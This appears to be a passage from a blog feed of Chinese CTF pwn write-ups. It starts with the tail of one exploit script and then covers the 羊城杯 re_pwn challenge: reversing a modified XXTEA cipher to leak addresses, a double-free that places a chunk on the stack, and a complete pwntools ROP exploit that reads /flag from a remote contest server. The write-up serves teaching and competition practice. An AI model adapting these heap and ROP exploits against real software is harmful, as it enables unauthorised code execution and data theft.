class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">0x1040</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;code size &gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;initial code &gt;&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.send(p8(0xe)+p64(0x601FA0)+p8(0xe)+p64(0x10000000000000000-0x1040)+p8(2))</span></span><br><span class="line">p.send(p8(<span class="number">0xe</span>)+p64(<span class="number">0x601FA0</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">0x10000000000000000</span>-<span class="number">0x1040</span>)+p8(<span class="number">2</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">1</span>)+p8(<span class="number">1</span>)+p8(<span class="number">0xe</span>)+p64(offset)+p8(<span class="number">3</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">1</span>)+p8(<span class="number">1</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">0x5812a8</span>)+p8(<span class="number">3</span>)+p8(<span class="number">0xe</span>)+p64(<span class="number">0x10000000000000000</span>-<span class="number">0x0000000000601fa0</span>+<span class="number">0x600</span>)+p8(<span class="number">3</span>)+p8(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯_Quals_repwn</title>
      <link href="/2020/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF_Quals_repwn/"/>
      <url>/2020/09/22/%E7%BE%8A%E5%9F%8E%E6%9D%AF_Quals_repwn/</url>
      
        <content type="html"><![CDATA[<h3 id="羊城杯-re-pwn"><a href="#羊城杯-re-pwn" class="headerlink" title="羊城杯 re_pwn"></a>羊城杯 re_pwn</h3><blockquote><p>记一次坑爹的house of force</p></blockquote><span id="more"></span><p>首先程序的逻辑很清楚：<br>add()限制size大小为0~0x68，dele()存在double free，show函数先允许向stack上输入，之后进行加密输出。</p><p>程式唯一的输出就是加密后的输出，因此此处是leak地址的地方，如果我们不输入的话加密的内容就是存在stack上的内容，通过解密可以拿到地址。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000│ rsp  0x7fffffffdb70 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdb78 —▸ 0x7fffffffddb8 —▸ 0x7fffffffe1a2 ◂— &#x27;XDG<span class="emphasis">_SEAT=seat0&#x27;</span></span><br><span class="line"><span class="emphasis">02:0010│      0x7fffffffdb80 —▸ 0x7fffffffdda8 —▸ 0x7fffffffe176 ◂— &#x27;/mnt/hgfs/share/ctf_</span>in<span class="emphasis">_2020/pwn/ycbctf/pwn2&#x27;</span></span><br><span class="line"><span class="emphasis">03:0018│      0x7fffffffdb88 ◂— 0x1f7ffe700</span></span><br><span class="line"><span class="emphasis">04:0020│      0x7fffffffdb90 ◂— 0x1f3c5d139400</span></span><br><span class="line"><span class="emphasis">05:0028│      0x7fffffffdb98 ◂— 0x1000000002</span></span><br><span class="line"><span class="emphasis">06:0030│ rdx  0x7fffffffdba0 ◂— 0x1200000033 /* &#x27;3&#x27; */</span></span><br><span class="line"><span class="emphasis">07:0038│      0x7fffffffdba8 ◂— 0x2400000078 /* &#x27;x&#x27; */</span></span><br><span class="line"><span class="emphasis">08:0040│ rdi  0x7fffffffdbb0 —▸ 0x7ffff7ffea88 —▸ 0x7ffff7ffe9b8 —▸   libc地址 0x7ffff7ffe728 —▸ 0x7ffff7ffe700 ◂— ...</span></span><br><span class="line"><span class="emphasis">09:0048│      0x7fffffffdbb8 —▸ 0x7fffffffdbf0 —▸ 0x7ffff7ffa280 ◂— add      byte ptr ss:[rax], al /* &#x27;6&#x27; */       stack地址</span></span><br></pre></td></tr></table></figure><p>可见通过解密可以得到stack地址和libc地址。</p><p>加密算法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E95</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [rsp+26h] [rbp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a3;                                      <span class="comment">// a1=buf</span></span><br><span class="line">                                                <span class="comment">// a2=16</span></span><br><span class="line">                                                <span class="comment">// a3=&#x27;/* 3 */&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    num = <span class="number">35</span> / a2 + <span class="number">7</span>;                          <span class="comment">// 9次</span></span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    v6 = a1[a2 - <span class="number">1</span>];                            <span class="comment">// buf[15]</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sum += <span class="number">0x76129BDA</span>;</span><br><span class="line">      v10 = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )            <span class="comment">// 15轮</span></span><br><span class="line">      &#123;</span><br><span class="line">        a1[i] += (((v6 &gt;&gt; <span class="number">7</span>) ^ (<span class="number">8</span> * a1[i + <span class="number">1</span>])) + ((a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">2</span>) ^ (<span class="number">32</span> * v6)) - <span class="number">33</span>) ^ ((a1[i + <span class="number">1</span>] ^ sum ^ <span class="number">0x57</span>)</span><br><span class="line">                                                                                        + (v6 ^ *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">4LL</span> * (v10 ^ i &amp; <span class="number">3</span>) + v5))</span><br><span class="line">                                                                                        + <span class="number">63</span>);</span><br><span class="line">        v6 = a1[i];</span><br><span class="line">      &#125;</span><br><span class="line">      a1[a2 - <span class="number">1</span>] += (((v6 &gt;&gt; <span class="number">7</span>) ^ (<span class="number">8</span> * *a1)) + ((*a1 &gt;&gt; <span class="number">2</span>) ^ (<span class="number">32</span> * v6)) - <span class="number">33</span>) ^ ((*a1 ^ sum ^ <span class="number">0x57</span>)</span><br><span class="line">                                                                               + (v6 ^ *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">4LL</span> * (v10 ^ i &amp; <span class="number">3</span>) + v5))</span><br><span class="line">                                                                               + <span class="number">63</span>);</span><br><span class="line">      v3 = a2 - <span class="number">1LL</span>;</span><br><span class="line">      result = (<span class="type">unsigned</span> __int8)a1[v3];</span><br><span class="line">      v6 = a1[v3];</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( num );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比较明显的地方在于<span class="number">0x76129BDA</span>，这个数值一般存在于tea加密算法中，比较一下：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">2</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密前原始数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;加密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现程序在调用加密函数前也有4个key，而且只是MX和DELTA不同，可认定是btea算法改的，因此写出解密脚本为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x76129BDA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX ( ( ((z&gt;&gt;7)^(y<span class="string">&lt;&lt;3)) + ((y&gt;</span>&gt;2)^(z&lt;&lt;5))-0x21 ) ^ ((sum^y^0x57) + (key[(p&amp;3)^e] ^ z)+0x3f) )</span></span><br><span class="line"><span class="comment">// #define MX (((((z&gt;&gt;7)^(y&lt;&lt;3)) + ((y&gt;&gt;2)^(z&lt;&lt;5)))-0x21) ^ (((sum^y^0x57) + (key[e^p&amp;3] ^ z))+0x3f))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint8_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> y,z;</span><br><span class="line">    <span class="type">uint32_t</span> sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">7</span> + <span class="number">35</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">7</span> + <span class="number">35</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> v[<span class="number">32</span>]= &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x33</span>,<span class="number">0x12</span>,<span class="number">0x78</span>,<span class="number">0x24</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,v,<span class="number">0x10</span>);</span><br><span class="line">    btea((<span class="type">uint8_t</span>*)v, -n, k);</span><br><span class="line">    write(<span class="number">1</span>,v,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为ELF再process进来即可解密。</p><p>之后的利用思路就很明显的hof了，先double free把堆申请到栈上，然后rop读flag。</p><p>要注意的是：heap大小最大0xx68不够用来完成rop，因此要先构造一次read以读入rop。</p><p>第一次覆盖返回地址是在read写content的时候，由于call read时将返回地址push rsp，之后并没有扩展栈帧的操作，因此之后将对应存放ret_addr的地方覆盖成执行gadget的地址即可。</p><p>最后exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./pwn2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&#x27;183.129.189.60&#x27;</span>,<span class="number">10029</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">show(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">enc = p.recvuntil(<span class="string">&quot;wellcome&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">p1 = process(<span class="string">&quot;./dec&quot;</span>)</span><br><span class="line">p1.send(enc)</span><br><span class="line">dec = p1.recv(<span class="number">0x10</span>)</span><br><span class="line">libc.address = u64(dec[:<span class="number">8</span>]) - <span class="number">0x5f1a88</span></span><br><span class="line">stack = u64(dec[<span class="number">8</span>:])</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAAAAA\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAAAAA\n&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">add(<span class="number">0x68</span>,p64(stack-<span class="number">0xf3</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAA\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi = <span class="number">0x000000000019dc65</span> + libc.address</span><br><span class="line">p_rsi = <span class="number">0x000000000013cd4f</span> + libc.address</span><br><span class="line">p_rdx = <span class="number">0x0000000000115166</span> + libc.address</span><br><span class="line">p_rax = <span class="number">0x000000000003a738</span> + libc.address</span><br><span class="line">syscall_ret = <span class="number">0x00000000000bc3f5</span> + libc.address</span><br><span class="line">rop_chain = [</span><br><span class="line">p_rdx,<span class="number">0x200</span>,p_rax,<span class="number">0</span>,</span><br><span class="line">syscall_ret</span><br><span class="line">]</span><br><span class="line">payload=p64(p_rdx)+p64(<span class="number">0x200</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># payload = flat(rop_chain)</span></span><br><span class="line"><span class="comment"># debug(0x000000000000E62)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;AAAAA\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x2b</span>+payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=p64(p_rdi)+p64(stack-<span class="number">0xb4</span>+<span class="number">0x1c</span>)+p64(p_rsi)+p64(<span class="number">0</span>)+p64(p_rdx)+p64(<span class="number">0</span>)+p64(p_rax)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line">payload+=p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rsi)+p64(stack+<span class="number">0x300</span>)+p64(p_rdx)+p64(<span class="number">0x30</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload+=p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rsi)+p64(stack+<span class="number">0x300</span>)+p64(p_rdx)+p64(<span class="number">0x30</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x4b</span>)+<span class="string">&#x27;/flag\x00\x00\x00&#x27;</span>+payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
